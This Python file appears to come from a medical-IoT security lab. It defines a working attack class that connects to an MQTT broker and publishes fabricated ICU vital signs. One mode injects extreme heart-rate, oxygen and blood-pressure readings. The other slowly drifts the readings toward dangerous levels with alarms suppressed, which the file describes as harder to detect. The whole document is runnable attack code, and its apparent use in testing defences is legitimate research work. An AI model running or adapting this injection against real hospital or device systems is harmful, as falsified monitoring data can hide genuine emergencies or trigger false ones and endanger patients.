"""
Data Injection Attack

Injects false medical data to mislead monitoring systems
"""
import paho.mqtt.client as mqtt
import json
import random
import time
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class DataInjectionAttack:
    """Injects false medical device data"""
    
    def __init__(self, broker_host: str = "localhost", broker_port: int = 1883):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.client = None
        self.is_attacking = False
    
    def inject_critical_vitals(self, duration: int = 60):
        """
        Inject critical (dangerous) vital signs
        
        Args:
            duration: Attack duration in seconds
        """
        logger.info(f"Injecting critical vitals for {duration}s")
        
        self.client = mqtt.Client(
            client_id=f"attacker_inject_{random.randint(1000, 9999)}",
            protocol=mqtt.MQTTv5,
            callback_api_version=mqtt.CallbackAPIVersion.VERSION2
        )
        
        try:
            self.client.connect(self.broker_host, self.broker_port, 60)
            self.is_attacking = True
            
            start_time = time.time()
            
            while time.time() - start_time < duration and self.is_attacking:
                # Inject false critical readings
                fake_data = {
                    "device_id": "ecg_FAKE",
                    "timestamp": datetime.now().isoformat(),
                    "device_type": "ecg_monitor",
                    "ward": "ICU",
                    "vital_signs": {
                        "heart_rate_bpm": random.choice([30, 180, 200]),  # Critical values
                        "spo2_percent": random.choice([75, 80, 85]),  # Low oxygen
                        "systolic_bp_mmhg": random.choice([80, 200, 220]),  # Extreme BP
                        "diastolic_bp_mmhg": random.choice([40, 130, 140]),
                        "temperature_c": random.choice([34.0, 41.0])  # Hypothermia/fever
                    },
                    "alarm_active": True,
                    "alarm_type": "INJECTED_ATTACK"
                }
                
                self.client.publish(
                    "iomt/telemetry/ICU/ecg_FAKE",
                    json.dumps(fake_data),
                    qos=1
                )
                
                time.sleep(2)  # Every 2 seconds
            
            logger.info("Data injection completed")
            
        except Exception as e:
            logger.error(f"Data injection failed: {e}")
        finally:
            if self.client:
                self.client.disconnect()
            self.is_attacking = False
    
    def inject_gradual_drift(self, duration: int = 120):
        """
        Slowly drift vital signs to dangerous levels
        
        More subtle attack - harder to detect
        """
        logger.info(f"Injecting gradual drift for {duration}s")
        
        self.client = mqtt.Client(
            client_id=f"attacker_drift_{random.randint(1000, 9999)}",
            protocol=mqtt.MQTTv5,
            callback_api_version=mqtt.CallbackAPIVersion.VERSION2
        )
        
        try:
            self.client.connect(self.broker_host, self.broker_port, 60)
            self.is_attacking = True
            
            start_time = time.time()
            heart_rate = 70  # Start normal
            
            while time.time() - start_time < duration and self.is_attacking:
                # Gradually increase heart rate
                heart_rate += random.uniform(0.5, 1.5)
                
                fake_data = {
                    "device_id": "ecg_DRIFT",
                    "timestamp": datetime.now().isoformat(),
                    "device_type": "ecg_monitor",
                    "ward": "ICU",
                    "vital_signs": {
                        "heart_rate_bpm": int(heart_rate),
                        "spo2_percent": 98 - (heart_rate - 70) * 0.1,  # Gradually decrease
                        "systolic_bp_mmhg": 120 + (heart_rate - 70) * 0.5,
                        "diastolic_bp_mmhg": 80,
                        "temperature_c": 37.0
                    },
                    "alarm_active": False,
                    "alarm_type": None
                }
                
                self.client.publish(
                    "iomt/telemetry/ICU/ecg_DRIFT",
                    json.dumps(fake_data),
                    qos=1
                )
                
                time.sleep(3)
            
            logger.info("Gradual drift completed")
            
        except Exception as e:
            logger.error(f"Drift attack failed: {e}")
        finally:
            if self.client:
                self.client.disconnect()
            self.is_attacking = False
    
    def stop(self):
        """Stop injection attack"""
        logger.info("Stopping data injection...")
        self.is_attacking = False
        if self.client:
            self.client.disconnect()


if __name__ == "__main__":
    attacker = DataInjectionAttack()
    
    print("Starting data injection test (15 seconds)...")
    attacker.inject_critical_vitals(duration=15)
    
    time.sleep(2)
    print("Attack test completed")
